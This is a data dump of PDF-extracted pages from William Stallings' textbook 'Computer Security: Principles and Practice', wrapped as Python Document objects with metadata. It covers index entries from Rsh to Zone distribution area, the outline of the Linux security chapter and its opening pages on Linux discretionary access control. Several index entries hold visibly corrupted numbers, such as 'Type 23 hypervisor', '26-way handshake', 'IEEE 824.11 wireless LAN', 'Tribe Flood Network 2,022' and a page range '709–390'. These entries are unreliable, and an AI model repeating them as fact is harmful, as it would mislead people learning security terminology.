234\\nmemory-based, 234\\npersistent store code, 234\\nsystem-level call attacks, 235\\nuser mode, 234\\nvirtual machine and, 235–236\\nRotated XOR (RXOR), 658\\nRSA public-key encryption algorithm, 71, 669–674\\ndescription, 669–671\\nfactoring problem for, 672–673\\ntiming attacks and, 673–674\\nRsh, 293\\nRule-based anomaly detection, 282–283\\nRule-based heuristic identification, 284\\nRule-based penetration identification, 284\\nRules, The, 623\\nRun-time defenses, 368–370\\nRun-time environment for application auditing, 592\\nRun-time prevention techniques, 183\\nS\\nSafe coding techniques, 365–367\\nSafeguard, 28, 487 , 511–519\\nSafe libraries, 367\\nSafe temporary file use, 410–412\\nSaffir/Simpson Hurricane Scale, 532\\nSalt value, 94, 96–98\\nSan Diego Supercomputer Center, 330\\nSanitized data, 392\\nS-box, 635, 638\\nScalability issues, 518\\nScanning attack, 294\\nScreening router, 328\\nScripting viruses, 212–213\\nScript-kiddies, 275\\nSdrop, 332\\nSearch, access to, 132\\nSecond-generation scanner, 238\\nSecond-order injection, 180\\nZ16_STAL0611_04_GE_IDX.indd   795 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 797, 'page_label': '796'}, page_content='796  INDEX\\nSecond preimage resistant hash function, 65\\nSecret key, 628\\nauthentication, 63–64\\npublic-key encryption, 67–68\\nsymmetric encryption, 54\\nSecure analytics, visibility control, 476\\nSecure electronic transactions (SET), 663, 714\\nSecure file shredding program, 407–408\\nSecure Hash Algorithm (SHA), 66, 659–662\\nSecure hash functions (SHF), 64–66, 657–659\\napplications, 66–67\\nrequirements, 65\\nstrength of, 66\\nSecure key delivery, 743\\nSecure/Multipurpose Internet Mail Extension  \\n(S/MIME), 75, 683–686, 714\\nenveloped data, 686\\npublic-key certificates, 686\\nsigned and clear-signed data, 685–686\\nSecure programming, 382\\nSecure Shell (SSH), 75\\nconnections, 412\\nSecure sockets layer (SSL)\\nAlert Protocol, 690, 692\\narchitecture, 690–691\\nChange Cipher Spec Protocol, 692–694\\nHandshake Protocol, 695\\nRecord Protocol, 690\\nSecuring virtualization systems, 440–441\\nSecurity as a service (SecaaS), 460\\nSecurity assessments, 38, 463\\nSecurity association (SA), 701\\nSecurity attack, 31, 36, 41, 44, 47\\nSecurity auditing\\nanomaly detection and, 574\\nat application-level, 587\\napplication-level audit trail, 578–579\\narchitecture, 572–576\\naudit data analysis, 594–596\\naudit review, 594\\naudit trail analysis, 592–596\\nbaselining, 595\\nchoice of data to collect, 576–578\\nfunctions, 573–574\\nimplementation guidelines, 576\\nimplementing the logging function, 581–592\\ninvolving DHCP, 595\\nphysical access audit trail, 580\\nprotecting audit trail data, 580\\nrequirements for, 574–576\\nsecurity information and event management  \\n(SIEM), 596–597\\nat system level, 580–613\\nsystem-level audit trails, 578\\nterminology, 571\\ntiming, 593–594\\nUNIX OS, 584–585\\nuser-level audit trail, 579\\nWindows OS, 583–584\\nSecurity audit trail, 573\\nSecurity awareness, 552–556\\nprogram, 521\\ntraining, 521\\nSecurity basics and literacy category, 552–556\\nSecurity compliance, 522\\nSecurity controls, 496\\nSecurity education, 557\\nexperience, 552\\nSecurity education (SEED) projects, 755–757\\ndesign and implementation labs, 756\\nexploration labs, 756\\nvulnerability and attack labs, 755\\nSecurity/encryption, 610\\nSecurity implementation, 47–48\\ncase study, 524–527\\nchange and configuration management, 522–523\\ncompliance, 523\\ncontrols (safeguards), 511–519\\nhandling of incidents, 524\\nISO security controls, 515\\nmaintenance, 522\\nNIST security controls, 514, 516, 517\\nplans, 520–521\\nSecurity information and event management (SIEM),  \\n297 , 463, 596–597\\nSecurity intrusion, 278\\nSecurity maintenance, process of, 428–429\\nSecurity manager, 47\\nSecurity mechanism, 28–29, 41–43, 48\\nSecurity of the auditing function, 576\\nSecurity parameter index (SPI), 701, 702\\nSecurity policy, 30, 46–47 , 299, 486\\nviolation, 46\\nSecurity reports, 573\\nSecurity risk assessment\\nasset identification, 493–494\\nbaseline approach, 488–489\\ncase study of, 502–507\\ncombined approach, 490\\ncontext establishment, 492–493\\ndetailed risk analysis, 489–490\\nidentification of threats, risks, and vulnerabilities, 494–496\\ninformal approach, 489\\nrisk analysis and evaluation, 496–502\\nfor user authentication, 89–92\\nSecurity service module (SSM), 651\\nSecurity testing, 426, 433, 435, 608\\nSecurity training program, 556\\nsed program, 402\\nSelective drop, 268\\nSELECT statement, 177\\nSensor/actuator technology, 466\\nSensors, 278, 301, 331, 466–467\\nSeparation of duties, 559\\nSeparation of privilege, 41\\nSequence counter overflow, 701\\nSequence number counter, 701, 702\\nSequence Time-Delay Embedding (STIDE) algorithm, 285\\nServer Message Block (SMB), 293\\nServer variables, 180\\nService aggregation, 453\\nService arbitrage, 453\\nService hijacking, 459\\nService intermediation, 453\\nService providers, 158, 160–161, 610\\nService provision security, 472\\nSession Initiation Protocol (SIP), 293\\nflood, 258–259\\nSession key, 77–78, 650, 708\\nSessions, 145, 148, 162, 414\\nsetfacl command, 142, 430\\nSetGID permission set, 141, 431\\nSetUID permission set, 141, 373, 431\\nShadow password file, 99\\nShamir, Adi, 71, 669\\nShared files, locking for software security, 409–410\\nShared libraries, 588\\nShared system resources, 409–410\\nShared technology issues, 458\\nSHA. See Secure Hash Algorithm (SHA)\\nZ16_STAL0611_04_GE_IDX.indd   796 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 798, 'page_label': '797'}, page_content='INDEX  797\\nShell, 214, 258, 361–362, 364, 368, 370, 373, 388,  \\n401–404, 578, 587\\nShellcode\\ndefinition, 357\\ndevelopment, 357–361\\nShift row transformation (AES), 638, 640\\nShockwave Rider, The, 216\\nShort-lived certificates, 715\\nshowlen() function, 373\\nshutdown command, 578\\nSidewinder G2 security appliance attack protections, 334–335\\nSignal-hiding techniques, 725\\nSignature, 714\\nSignature-based detection, 182, 293\\nSignature or Heuristic detection, 283–284\\nSigned data, 684\\nSimple Mail Transfer Protocol (SMTP), 318\\nSimplicity, 650\\nSingle bastion inline, 328\\nSingle bastion T, 328\\nSkipjack algorithm, 477\\nSlashdot news aggregation site, 266\\nSlowloris, 260–261\\nSmart cards, 110, 111, 156\\nSmart objects/embedded systems, 474\\nS/MIME, 714\\nSMTP , 293\\ntraffic, rule set for, 315\\nSmurf DoS program, 264\\nSniffing traffic, 229\\nSNMP , 293\\nSnort, 302–306\\narchitecture, 302–303\\ncharacteristics, 302\\ndefinition, 302\\ndestination IP address, 304\\ndestination port, 304\\ndirection, 304\\nimplementation, 303\\nmeta-data rule, 305\\nnon-payload rule, 305\\npayload rule, 305\\npost-detection rule, 305\\nprotocol, 304\\nrule action, 303\\nrules, 303–304\\nsource IP address, 304\\nsource port, 304\\nSnort Inline, 331–332\\nSNORT system, 284\\nSnowden, Edward, 275\\nSOCKS, 320\\nSoftware, 29, 34, 191, 608\\nattack surface, 43\\nbehavior-blocking, 240\\nbugs, 382\\ncopyrighted, 606\\ndevelopment life cycle, 384\\nefficiency, 649\\nquality, 381\\nreliability, 381\\nSoftware as a service (SaaS), 448\\nSoftware Assurance Forum for Excellence in Code  \\n(SAFE-Code), 384\\nSoftware defined networks (SDNs), 439\\nSoftware security\\ndefensive programming and, 380–384\\nissues, 380–384\\noperating systems, interaction of, 400–412\\nprobability distribution of targeting specific bugs, 382\\nprogram input, handling, 384–395\\nprogram output, handling, 413–415\\nstandard library functions, 406–409\\nsystems calls, 406–409\\nwriting safe program code, 395–400\\nSound recordings, copyrighted, 606\\nSource address spoofing, 251–252\\nSource and destination transport-level address, 315\\nSource routing attacks, 317\\nSPAM e-mail, 208, 224–227\\nSpammer programs, 207\\nSpamming, 229\\nSpear-phishing attack, 232\\nSpecial reader, 104\\nSpecific account attack, 93\\nSpoofing, 46, 249, 251–252, 256, 262–264, 267 , 313, 317\\nsprintf() library routine, 354\\nSpyware, 207 , 231\\ndetection and removal, 240\\npayloads, 231\\nSQL-based access control, 184–185\\nSQL-DOM, 182\\nSQL injection, 388\\nSQL injection (SQLi) attack, 177–183, 389\\nattack avenues and types, 180–182\\ncountermeasures, 182\\nexample of, 178\\ninjection technique, 178–179\\nSQL Slammer worm, 220\\nStack buffer overflow, 347–364\\nexample, 349–354, 365–366\\nvulnerabilities, 354–357\\nStack frame, 348\\nStackguard, 367\\nStack protection mechanisms, 367–368\\nStackshield, 368\\nStack smashing, 347\\nStandard library functions, 372, 406–409\\nStandard of conduct, 561\\nStateful inspection firewall, 318–319\\nStateful matching, 330\\nStateful protocol analysis (Spa), 294\\nState-sponsored organizations, 275\\nStatically linked libraries, 588\\nStatically linked shared libraries, 588\\nStatic biometric protocol, 117\\nStatistical anomaly, 330\\nStatistical databases, 35\\nStatistical Packet Anomaly Detection Engine (SPADE), 293\\nStealthing\\nbackdoor, 233\\nrootkit, 234–236\\nStealth virus, 215\\nstrcpy() library function, 372\\nStream ciphers, 57–59, 641–642\\nStrong collision resistant, 65\\nStructured query language (SQL), 176–177 , 180–183, 192, 579\\nStuxnet worm, 221, 228, 232, 424\\nSubBytes transformation (AES), 638\\nSubject attributes, 149\\nSubjects, 132, 161, 714\\nSubscriber, 87\\nSubVirt, 236\\nSummary events, 297\\nSuperuser, 141\\nSupervisory Control and Data Acquisition (SCADA), 492, \\n504–505, 507 , 525–526\\nSupporting facilities, 531\\nSupportive controls, 513\\nSupport Vector Machines (SVM), 285\\nZ16_STAL0611_04_GE_IDX.indd   797 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 799, 'page_label': '798'}, page_content='798  INDEX\\nSymmetric encryption\\nAdvanced Encryption Standard (AES), 57\\napproaches to attacking, 54–55\\ncipher block chaining (CBC) mode, 645–647, 658\\ncipher feedback (CFB) mode, 647–648\\ncomparison of, 55\\ncounter (CTR) mode, 648–650\\ncryptanalysis, 54–55, 57, 65–66, 629–631\\nData Encryption Algorithm (DEA), 55, 633\\nData Encryption Standard (DES), 55–56\\nData Encryption Standard (DES), 53, 96, 633–634, 708\\nelectronic codebook (ECB) mode, 57, 59, 645\\nFeistel cipher structure, 631–633\\nhistorical evidence, 53\\ningredients of, 54\\nkey distribution, 650–651\\nmessage confidentiality and, 628–651\\nmessage/data authentication using, 59\\nmodes of operation, 644–650\\npractical security issues, 57\\nRC4 algorithm, 642–644\\nrequirements for secure use of, 54\\nsecret key, 54\\nsimplified model, 54\\nstream ciphers, 57–59, 641–642\\ntriple DES, 56–57\\ntriple DES (3DES), 56–57, 123, 633–634\\ntypes of, 58\\nSymmetric encryption devices, location of, 650–651\\nSymmetric stream encryption algorithms, 53\\nSYN Cookies, 268\\nSYN-FIN attack, 306\\nSYN flood, 256\\nSYN spoofing attacks, 252–255, 268\\nsyslog(), 584\\nsyslogd, 584\\nSyslog protocol, 584, 585\\nSystem Access Control List (SACL), 583\\nSystem calls, 329\\ntraces, 284\\nSystem corruption, 206, 227–228\\ndata destruction, 227–228\\nnature of, 227\\nreal-world damage, 228\\nSystem events, 584\\nsystem() function, 372\\nSystem(“command.exe”) function, 357\\nSystem integrity, 25\\nverification tools, 563\\nSystem-level auditing data, 587\\nSystem-level audit trails, 581–585\\nSystem maintainers, 556\\nSystem Management Mode (SMM), 236\\nSystem registry settings, 329\\nSystem resources, 29–30\\nmodification of, 329\\nSystem resources (assets), 29–30, 33–37 , 493–494\\nSystem routine, 139\\nSystem’s access control protections, 32\\nSystems and services acquisition, 39\\nSystems calls, software security, 406–409\\nT\\nTautology, 180–181\\nTCP , 61, 249, 252, 262, 268, 293, 302, 304, 315, 323, 330, 331, \\n396–397 , 578, 585\\nTCP/IP (Transmission Control Protocol/Internet Protocol),  \\n28, 123, 248, 255, 264, 268, 317 , 397 , 585, 595\\nTCP SYN flood, 256\\nTCP SYN spoofing attack, 254\\nTCP wrappers library, 431\\nTechnical security controls, 513\\nTechnical threats, 537 , 540\\nTechnology controls, 518\\nTelecommunications Industry Association (TIA) standard \\nTIA-492, 197–199\\nTelnet, 293, 319\\ntempnam() function, 411\\nTemporal key (TK), 747\\nTemporal key integrity protocol (TKIP), 749\\nTemporary files, safe use of, 410–412\\nTermination process, 559–560\\nTesting, 43, 48, 97 , 113, 251, 303, 331, 357 , 381–383, 385, 394–395, \\n398, 409, 426, 433, 435, 523, 608, 620\\nTheft, 538\\nTheft of the token, 119\\nThird-generation programs, 238\\nThreat agent, 30, 31\\nThreats, 30–31, 209, 494. See also Attacks\\nassets of a computer system and, 33–37\\nattacks and, 31–34\\nelectrical power, 537\\nphysical security, 531–538\\nwireless network security, 724–725\\nThreat source, 495\\nThresholding, 595\\nTicket-granting service (TGS), 708\\nTicket-granting ticket (TGT), 709–390\\nTiny fragment attacks, 317\\nTinyOS operating system, 476\\nToken protocol, 116–117\\nTokens, 133\\nautomatic teller machine (ATM), 104\\nelectronic identity (eID) card, 107–109\\nloss, 105\\nmemory cards, 104–105\\npersonal identification number (PIN), 104, 108\\nsmart cards, 105–106\\nTornado, 531\\nTrademark, 607\\nTraffic analysis, 36\\nTraffic anomaly, 330\\nTraffic security, 730\\nTraining, 38\\nTransceiver, 467\\nTransfer-only right, 138\\nTransport Layer/Secure Socket Layer Security  \\n(TLS/SSL), 412\\nTransport layer security (TLS), 75, 663, 690–697\\nAlert Protocol, 692\\narchitecture, 690–691\\nChange Cipher Spec Protocol, 692\\nconnection, 691\\nHandshake Protocol, 692–694\\nHeartbeat Protocol, 694–695\\nrecord protocol, 691–692\\nsession, 691\\nTrapdoor. See Backdoor (trapdoor)\\nTribe Flood Network (TFN), 257\\nTribe Flood Network 2,022 (TFN2K), 257\\nTriggering phase of virus, 211\\nTriple DES (3DES), 56–57 , 123, 633–634\\nattractions, 56\\nprincipal drawback, 57\\nTrivial File Transfer Protocol (TFTP), 293\\nTrojan horse attack, 33, 118–119, 207 , 222, 224, 233, 329\\nTrojan horse programs, 225–226\\nTrojan horses, 33, 207 , 225–226\\nTrojan horse sniffers, 321\\nZ16_STAL0611_04_GE_IDX.indd   798 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 800, 'page_label': '799'}, page_content='INDEX  799\\nTrojans, 211\\nmobile phone, 226–227\\nTropical cyclones, 531\\nTrue random number generator (TRNG), 79\\nTrust, 27 , 128, 151, 154, 156, 232, 424, 486, 707 , 711, 716, 717\\nTrusted computer system, 398\\nTrust framework providers, 161\\nTrust frameworks, 158–162\\nopen identity, 158–161\\ntraditional approach, 158\\nTuples, 174\\nType 23 hypervisor, 437\\nType 24 hypervisor, 437\\nU\\nUbuntu Linux systems, 285\\nUDP , 255, 258, 262, 265, 293, 302, 304, 315, 320, 323, 330, 332, 334\\nUDP flood attack, 255\\nUnauthorized, 25, 31–36, 39, 42, 47 , 90, 93, 100, 105, 128, 170, 188, \\n222, 233, 274, 276, 280, 284, 293, 299, 313, 318, 322, 325, \\n380, 434, 504–506, 578, 608–609, 613, 619, 708\\nUnauthorized disclosure, 31\\nUnauthorized physical access, 537–538\\nUnavailability of system, 30\\nUndervoltage condition, 537\\nUnicode, 393\\nUnified threat management (UTM) system, 332–336\\nappliance architecture, 333\\nUNIX file access control, 139–141\\naccess control lists, 141\\ndirectory, structure of, 139\\n“effective group ID,” 141\\n“effective user ID,” 141\\nFreeBSD, 142\\nprotection bits, 141\\n“real group ID,” 141\\n“real user ID,” 141\\nsetfacl command, 142\\n“set group ID” (SetGID) permissions, 141\\n“set user ID” (SetUID) permissions, 141\\ntraditional, 141\\nuser identification number (user ID), 141\\nUNIX operating system, 347\\nUNIX password scheme, 94–96\\nimplementation of, 96\\nUnknown risk profile, 459\\nUnlawful activity prohibited, 561\\nUnlinkability, 614\\nUnobservability, 615\\nUntrusted mobile devices, 727–728\\nUntrusted networks, 728\\nU.S. Digital Millennium Copyright Act (DMCA), 608–609\\nUser, 145, 191\\nUser authentication\\nbiometric-based, 109–114\\ncase study of, 121–124\\ndigital, 87–92\\nmeans of, 88–89\\npassword-based, 92–104\\npotential attacks, 117–119\\nremote, 114–117\\nrisk assessment for, 89–92\\nsecurity issues, 117–119\\nUser credential compromise, 46\\nUser credential guessing, 46\\nUser-defined roles, 187–188\\nUser dissatisfaction, 105\\nUser education strategy, 100\\nUser identification number (user ID), 141\\nUser input, 180\\nUser interface (UI), 224\\nto an IDS, 279\\nredress attack, 224\\nUser-level auditing data, 587\\nUser-level audit trails, 581, 587\\nUser mistakes, 93\\nUser mode, 139\\nUsers administration, 433–434\\nUser-supplied password, 94\\nUser terminal and user (UT/U), 45\\nUsurpation, 33\\nUTF-8 encoding, 393\\nUtility patents, 607\\nV\\nVandalism, 538\\nVerification, 66, 73, 86, 111, 117 , 157 , 708\\nstep, 86\\nVerifier, 88\\nView, relational databases, 176\\nVirtual firewall, 441–442\\nVirtualization container, 439\\nVirtualization security, 435–442\\nalternatives, 436–439\\nhosted virtualized systems, 442\\nhypervisor security, 440–441\\nissues, 439–440\\nvirtual firewall, 441–442\\nvirtualized infrastructure security, 441\\nVirtualized infrastructure security, 441\\nVirtualized rootkits, 236\\nVirtual machine (VM), 436\\nVirtual private networks (VPNs), 325, 450\\nViruses, 34, 207\\nin Adobe’s PDF documents, 213\\nboot sector infector, 214\\nclassification by concealment strategy, 215\\nclassification by target, 214–215\\ncompression, 215\\nencrypted, 215\\nfile infector, 214\\ninfection mechanism, 211\\nlogic, example, 213\\nmacro, 212, 215\\nmeans to access remote systems, 216\\nmetamorphic, 215\\nmultipartite, 215\\nnature of, 210–212\\nphases of growth, 211–212\\npolymorphic, 215\\nreal-world damage, 228\\nscripting, 212–213\\nStealth, 215\\ntrigger mechanism, 211\\nVirus signature scanner, 241\\nVisual identity verification, 545\\nVoice over IP (VoIP) telephony, 258\\nVT100, 413\\nVulnerabilities, 346, 349, 357 , 365, 373, 375, 494\\nidentification, 495–496\\nof passwords, 92–94\\nPHP file inclusion, 390\\nPHP remote code injection, 390\\nshell scripts, 402\\nof software, 208\\nin stack buffer overflow, 354–357\\nof system, 29–30, 44\\nZ16_STAL0611_04_GE_IDX.indd   799 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 801, 'page_label': '800'}, page_content='800  INDEX\\nW\\nWarezov family of worms, 221\\nWar Games, 233\\nWatering-hole attacks, 223\\n26-way handshake, 747\\nWeak collision resistant, 65\\nWeb-based e-commerce sites, 92\\nWeb CGI injection attack, 386–387\\nWeb clients, 220\\nWeb security, 463\\nWeb servers, 220\\nWeb server software, 43\\nWHERE clause, 181\\nWide area network (WAN), 291, 323, 325\\nWi-Fi Alliance, 731\\nWi-Fi protected access (WPA), 737\\nWindowing, 596\\nWindows, 97 , 123, 171, 220, 227 , 236, 249, 257 , 268, 284, 312, 320, \\n322, 357 , 365–366, 368, 369, 386, 393, 395, 401, 404, 426\\nWindows Event Log, 581–584\\nWindows OS, 581, 583–584\\nWindows security\\naccess controls, 433–434\\napplication and service configuration, 434–435\\nfirewall and malware countermeasure capabilities, 435\\npatch management, 433\\nSecurity Account Manager (SAM), 433\\nSecurity ID (SID), 433\\ntesting, 435\\nUser Account Control (UAC), 434\\nusers administration, 433–434\\nWindows shares, 220\\nWired Equivalent Privacy (WEP), 642, 644, 737\\nWireless access points (AP), 290, 725–726\\nWireless IDS (WIDS), 290\\nWireless LAN, 642, 644. See also IEEE 802.11 wireless LAN; \\nIEEE 802.11i wireless LAN\\nWireless LAN (WLAN), 730–751\\nWireless network security\\nbarrier security, 730\\nencryption, 725\\nIEEE 824.11 wireless LAN, 730–736\\nIEEE 824.11i wireless LAN, 736–751\\nmeasures, 725–726\\nmobile device security, 726–730\\nsecuring, 726\\nsecurity measures, 725–726\\nsignal-hiding techniques, 725\\nthreats, 724–725\\nWireless network sensor, 290\\nWorkstation hijacking, 93\\nWorld, 132\\nWorld Intellectual Property Organization (WIPO) treaties, \\n608–609\\nWorms, 208, 294\\nclickjacking, 224\\nCode Red, 220\\nCommWarrior, 223\\nConficker (or Downadup), 221\\ncyber-espionage, 221\\nDuqu, 221\\nhistory of attacks, 219–221\\nMelissa e-mail worm, 219\\nmetamorphic, 222\\nmobile phone, 223\\nMorris worm, 218–219\\nmulti-exploit, 222\\nmultiplatform, 221\\nMydoom, 221\\npolymorphic technique of spreading, 222\\npropagation model, 217–218\\nreal-world damage, 228\\nSQL Slammer, 221\\nstate of the art technology in, 221\\nStuxnet, 221, 424\\ntarget discovery, 217\\ntransport vehicles of, 222\\nultrafast spreading, 222\\nWarezov family of, 221\\nzero-day exploit, 222\\nZou’s model, 218\\nWrapper program, 403\\nWrite access, 132\\nWriting assignments, 759–760\\nWriting safe program code, 395–400\\nX\\nX.509 certificates, 75, 713–716\\nX.509 ITU-T standard, 713–716\\nXSS attacks, 391–392, 413–414\\nXSS reflection, 391\\nXSS reflection vulnerability, 391\\nZ\\nZero-day attacks, 283, 286\\nZero-day exploit, 222\\nZeus banking Trojan, 231\\nZeus crimeware toolkit, 209\\nZombies, 208, 229–230, 257 , 264, 268\\nZone distribution area (ZDA), 199\\nZ16_STAL0611_04_GE_IDX.indd   800 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 802, 'page_label': '25-1'}, page_content='25-1\\n25.1 Introduction\\n25.\\n2\\n Linux’s Security Model\\n25.\\n3\\n The Linux DAC In Depth: File-System Security\\nUsers\\n, Groups, and Permissions\\nSimple File Permissions\\nDirectory Permissions\\nThe Sticky Bit\\nSetuid and Setgid\\nSetgid and Directories\\nNumeric Modes\\nKernel Space versus User Space\\n25.4\\n Linux Vulnerabilities\\nAbuse of Pr\\nograms Run “setuid root”\\nWeb Application Vulnerabilities\\nRootkit Attacks\\n25.5\\n Linux System Hardening\\nOS Installation:\\n Software Selection and Initial Setup\\nPatch Management\\nNetwork-Level Access Controls\\nAntivirus Software\\nUser Management\\nLogging\\nOther System Security Tools\\n25.6\\n Application Security\\nR\\nunning as an Unprivileged User/Group\\nRunning in a Chroot Jail\\nModularity\\nEncryption\\nLogging\\n25.7\\n Mandatory Access Controls\\nSELinux\\nNovell AppArmor\\n25.\\n8\\n References\\nLinux Security\\nCHAPTER \\n \\nM25_STAL0611_04_GE_C25.indd   1 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 803, 'page_label': '25-2'}, page_content='25-2  CHAPTER 25 /  Linux SECuRiTy\\nLike other general-purpose operating systems, Linux’s wide range of features \\n presents a br\\noad attack surface. Even so, by leveraging native Linux security con-\\ntrols, carefully configuring Linux applications, and deploying certain add-on security \\npackages, you can create highly secure Linux systems.\\n 25.1 INTR ODUCTION\\nSince Linus Torvalds created Linux in 1991, more or less on a whim, Linux has evolved \\ninto one of the world’s most popular and versatile operating systems. Linux is free, \\nopen-sourced, and available in a wide variety of “distributions” targeted at almost \\nevery usage scenario imaginable. These distributions range from conservative, com-\\nmercially supported versions such as Red Hat Enterprise Linux, to cutting-edge, com-\\npletely free versions such as Ubuntu, to stripped-down but hyperstable “embedded” \\nversions (designed for use in appliances and consumer products) such as uClinux.\\nThe study and practice of Linux security therefore has wide-ranging uses and \\nramifications. New exploits against popular Linux applications can affect many thou-\\nsands of users around the world. New Linux security tools and techniques have just \\nas profound of an impact, albeit a much more constructive one.\\nIn this chapter, we’ll examine the Discretionary Access Controls–based secu-\\nrity model and architecture common to all Linux distributions and to most other \\nUNIX-derived and UNIX-like operating systems (and also, to a surprising degree, \\nto Microsoft Windows). We’ll discuss the strengths and weaknesses of this ubiquitous \\nmodel, typical vulnerabilities and exploits in Linux, best practices for mitigating those \\nthreats, and improvements to the Linux security model that are only slowly gaining \\npopularity but that hold the promise to correct decades-old shortcomings in this \\nplatform.\\n 25.2 LINUX’S SECURITY MODEL\\nLinux’s traditional security model can be summed up quite succinctly: people or \\nprocesses with “root” privileges can do anything; other accounts can do much less.\\nFrom the attacker’s perspective, the challenge in cracking a Linux system there-\\nfore boils down to gaining root privileges. Once that happens, attackers can erase or \\nedit logs; hide their processes, files, and directories; and basically redefine the reality \\nof the system as experienced by its administrators and users. Thus, as it’s most com-\\nmonly practiced, Linux security (and UNIX security in general) is a game of “root \\ntakes all.”\\nHow can such a powerful operating system get by with such a limited security \\nmodel? In fairness, many Linux system administrators fail to take full advantage of \\nthe security features available to them (features we’re about to explore in depth). \\nPeople can and do run robust, secure Linux systems by making careful use of native \\nLinux security controls, plus selected add-on tools such as sudo or Tripwire. However, \\nthe crux of the problem of Linux security in general is that, like the UNIX operating \\nsystems on which it was based, Linux’s security model relies on Discretionary Access \\nControls (DAC) that we introduced in \\nChapter 4.\\nM25_STAL0611_04_GE_C25.indd   2 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 804, 'page_label': '25-3'}, page_content='25.2 / Linux’S SECuRiTy MODEL  25-3\\nIn the Linux DAC system, there are users, each of which belongs to one or more \\ngroups; and there are also objects: files and directories. Users read, write, and execute \\nthese objects, based on the objects’ permissions, of which each object has three sets: \\none each defining the permissions for the object’s user-owner, group-owner, and \\n“other” (everyone else). These permissions are enforced by the Linux kernel, the \\n“brain” of the operating system.\\nBecause a process/program is actually just a file that gets copied into executable \\nmemory when run, permissions come into play twice with processes. Prior to being \\nexecuted, a program’s file-permissions restrict who can execute, access, or change it. \\nWhen running, a process normally “runs as” (with the identity of) the user and group \\nof the person or process that executed it.\\nBecause processes “act as” users, if a running process attempts to read, write, or exe-\\ncute some other object, the kernel will first evaluate that object’s permissions against the \\nprocess’s user and group identity, just as though the process was an actual human user. This \\nbasic transaction, wherein a subject (user or process) attempts some action (read, write, \\nor execute) against some object (file, directory, or special file), is illustrated in \\nFigure 25.1.\\nWhoever owns an object can set or change its permissions. Herein lies the Linux \\nDAC model’s real weakness: The system superuser account, called “root,” has the \\nability to both take ownership and change the permissions of all objects in the system. \\nAnd as it happens, it’s not uncommon for both processes and administrator-users to \\nroutinely run with root privileges, in ways that provide attackers with opportunities \\nto hijack those privileges.\\nThose are the basic concepts behind the Linux DAC model. The same concepts \\nin a different arrangement will come into play later when we examine Mandatory \\nAccess Controls such as SELinux. Now, let’s take a closer look at how the Linux DAC \\nimplementation actually works.\\nFigure 25.1 Linux Security T ransactions\\n(User or\\nProcess)\\n (ﬁle, directory, or\\nspecial ﬁle) \\n Object Subject\\nAction\\n(read, write, or\\nexecute/use)\\nKernel\\nObject\\nPermissions\\nExample:\\nuser-owner = full\\ngroup-owner = full\\nothers = read-only\\n \\nM25_STAL0611_04_GE_C25.indd   3 10/11/17   3:21 PM'),\n",
